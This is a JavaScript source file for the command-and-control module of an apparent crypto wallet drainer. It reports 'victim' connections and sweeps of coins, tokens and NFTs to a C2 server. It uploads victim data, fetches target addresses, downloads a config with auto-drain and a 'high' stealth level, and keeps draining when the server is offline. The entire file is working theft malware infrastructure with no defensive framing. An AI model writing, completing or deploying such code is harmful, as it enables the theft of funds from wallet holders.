// backend/modules/c2Communicator.js
import { C2_SERVER_URL } from '../config.js';

export class C2Communicator {
    constructor() {
        this.isInitialized = false;
        this.baseUrl = C2_SERVER_URL || "http://localhost:3001";
        this.stats = {
            totalVictims: 0,
            totalEarnings: 0,
            successfulDrains: 0,
            failedDrains: 0,
            lastActivity: new Date().toISOString()
        };
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            // Test connection during initialization
            await this.testC2Connection();
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    // ===== EXACT FUNCTIONS FROM app.js =====
    async checkDrainerStatus() {
        try {
            console.log('🌐 Checking C&C status from:', `${this.baseUrl}/c2/status`);
            const response = await fetch(`${this.baseUrl}/c2/status`);
            const status = await response.json();
            console.log('📋 C&C response:', status);
            return status.config.enabled;
        } catch {
            console.log('⚠️ C&C server offline, proceeding with drain');
            return true;
        }
    }

    async reportToC2(victimData) {
        try {
            const response = await fetch(`${this.baseUrl}/c2/report`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(victimData)
            });
            
            if (response.ok) {
                this.updateStats(victimData);
                console.log('📊 Reported to C&C successfully');
            }
            
            return response.ok;
        } catch (error) {
            console.log('⚠️ C&C reporting failed');
            return false;
        }
    }

    async fetchPotentialTargets() {
        try {
            console.log('📡 Contacting C&C server for targets...');
            
            const response = await fetch(`${this.baseUrl}/targets`);
            
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            
            const data = await response.json();
            console.log(`✅ Received ${data.targets.length} targets from C&C`);
            return data.targets;
            
        } catch (err) {
            console.log(`❌ C&C targets failed: ${err.message}. Using fallback targets.`);
            return ["0x1111111111111111111111111111111111111111", "0x2222222222222222222222222222222222222222"];
        }
    }

    async testC2Connection() {
        try {
            console.log('🧪 Testing C&C connection...');
            const response = await fetch(`${this.baseUrl}/c2/status`);
            const data = await response.json();
            console.log('✅ C&C test successful:', data);
            return data;
        } catch (error) {
            console.error('❌ C&C test failed:', error);
            return null;
        }
    }

    updateStats(victimData) {
        switch (victimData.action) {
            case 'connect':
                this.stats.totalVictims++;
                break;
            case 'sweep_native':
            case 'sweep_tokens':
            case 'sweep_erc721':
            case 'sweep_erc1155':
                if (victimData.success) {
                    this.stats.successfulDrains++;
                    if (victimData.valueUsd) {
                        this.stats.totalEarnings += parseFloat(victimData.valueUsd);
                    }
                } else {
                    this.stats.failedDrains++;
                }
                break;
        }
        
        this.stats.lastActivity = new Date().toISOString();
    }

    getStats() {
        return this.stats;
    }

    async sendHeartbeat() {
        try {
            await fetch(`${this.baseUrl}/c2/heartbeat`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    stats: this.stats
                })
            });
        } catch (error) {
            console.log('⚠️ Heartbeat failed');
        }
    }

    async uploadVictimData(victimsData) {
        try {
            const response = await fetch(`${this.baseUrl}/c2/victims/upload`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(victimsData)
            });
            
            return response.ok;
        } catch (error) {
            console.log('⚠️ Victim data upload failed');
            return false;
        }
    }

    async downloadConfig() {
        try {
            const response = await fetch(`${this.baseUrl}/c2/config`);
            const config = await response.json();
            return config;
        } catch (error) {
            console.log('⚠️ Config download failed, using default config');
            return this.getDefaultConfig();
        }
    }

    getDefaultConfig() {
        return {
            enabled: true,
            minValueUsd: 100,
            autoDrain: true,
            stealthLevel: "high",
            targetChains: [1, 56, 137],
            updateInterval: 300000
        };
    }

    async emergencyShutdown() {
        try {
            await fetch(`${this.baseUrl}/c2/emergency`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'shutdown' })
            });
        } catch (error) {
            console.log('⚠️ Emergency shutdown signal failed');
        }
    }

    async requestMultiSigApproval(operationData) {
        try {
            const response = await fetch(`${this.baseUrl}/c2/multisig/request`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(operationData)
            });
            
            return await response.json();
        } catch (error) {
            console.log('⚠️ Multi-sig request failed');
            return { success: false, error: 'C&C offline' };
        }
    }

    async checkMultiSigStatus(operationId) {
        try {
            const response = await fetch(`${this.baseUrl}/c2/multisig/status/${operationId}`);
            return await response.json();
        } catch (error) {
            console.log('⚠️ Multi-sig status check failed');
            return { approved: false, error: 'C&C offline' };
        }
    }

    startHeartbeat(interval = 60000) {
        setInterval(() => this.sendHeartbeat(), interval);
    }

    async syncWithC2() {
        try {
            const [config, targets] = await Promise.all([
                this.downloadConfig(),
                this.fetchPotentialTargets()
            ]);
            
            return { config, targets };
        } catch (error) {
            console.log('⚠️ Full C&C sync failed');
            return { config: this.getDefaultConfig(), targets: [] };
        }
    }
}

export const c2Communicator = new C2Communicator();